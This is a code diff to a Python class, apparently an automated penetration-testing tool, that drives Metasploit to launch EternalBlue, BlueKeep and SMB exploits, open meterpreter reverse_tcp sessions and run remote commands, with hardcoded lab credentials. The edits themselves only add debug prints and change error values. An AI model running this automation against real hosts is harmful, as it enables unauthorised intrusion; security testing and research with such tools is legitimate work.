@@ -210,10 +210,12 @@ class MetasploitInterface:
         cid = self.client.consoles.console().cid
         try:
             sid_before = list(self.client.sessions.list.keys())[-1]
+            print(sid_before)
             results = self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
             if self.verbosity == "INFO":
                 print(results)
             sid_after = list(self.client.sessions.list.keys())[-1]
+            print(sid_after)
 
         except IndexError: 
             """ THIS INDEX ERROR CATCHES NO SESSIONS ON START UP"""
@@ -237,12 +239,14 @@ class MetasploitInterface:
            
         else:
             """ EXECUTION OF REMOTE COMMANDS IF SESSION WAS CREATED"""
+            print(sid_after)
             try:
                 shell = self.client.sessions.session(sid_after)
                
                 user_level = shell.run_with_output("getuid")
                 
                 user_level = user_level.split(":")[1].lstrip()
+                
                 
                 directory = shell.run_with_output('pwd')
                 
@@ -258,12 +262,13 @@ class MetasploitInterface:
             except Exception as e:
                 if self.verbosity == "DEBUG":
                     print(f"There was an error with Eternal Blue (see below) \n {e}")
-                user_level = "No access"
+                user_level = ""
                 success = False
         
         self.client.consoles.console(cid).destroy
 
         self.portBindings.remove(localPort)
+        print(user_level)
         return success, user_level, results
 
     def rdpScanner(self, target, exploit, port):
@@ -335,7 +340,7 @@ class MetasploitInterface:
         if(sid_before == sid_after):
             if self.verbosity == "DEBUG":
                 print("There was an issue creating a session and or the host is not vulnerable")
-            user_level = "No access"
+            user_level = ""
             success = False
            
         else:
@@ -356,7 +361,7 @@ class MetasploitInterface:
             except Exception as e:
                 if self.verbosity == "DEBUG":
                     print(f'There was an issue with BlueKeep (see below)\n {e}')
-                user_level = "No access"
+                user_level = ""
                 success = False
         
         self.client.consoles.console(cid).destroy
@@ -584,7 +589,7 @@ class MetasploitInterface:
                 if self.verbosity == "DEBUG":
                     print(f'There was an issue creating a session or the host is not vulnerable (see below):\n {e}')
 
-                user_level = "No access"
+                user_level = ""
                 success = False
 
         
@@ -668,7 +673,7 @@ class MetasploitInterface:
         exploit["RPORT"] = port
         exploit["SMBPass"] = "Passw0rd!"
         exploit["SMBUser"] = 'IEUser'
-        exploit["ConnectTimeout"] = 100
+        exploit["ConnectTimeout"] = 10
 
         payload = self.client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
 
@@ -699,7 +704,7 @@ class MetasploitInterface:
         if(sid_before == sid_after):
             if self.verbosity == "DEBUG":
                 print("There was an issue creating a session or the host is not vulnerable" )
-            user_level = "No access"
+            user_level = ""
             success = False
            
         else:
@@ -719,7 +724,7 @@ class MetasploitInterface:
             except Exception as e:
                 if self.verbosity == "DEBUG":
                     print(e)
-                user_level = "No access"
+                user_level = ""
                 success = False
         
         self.client.consoles.console(cid).destroy
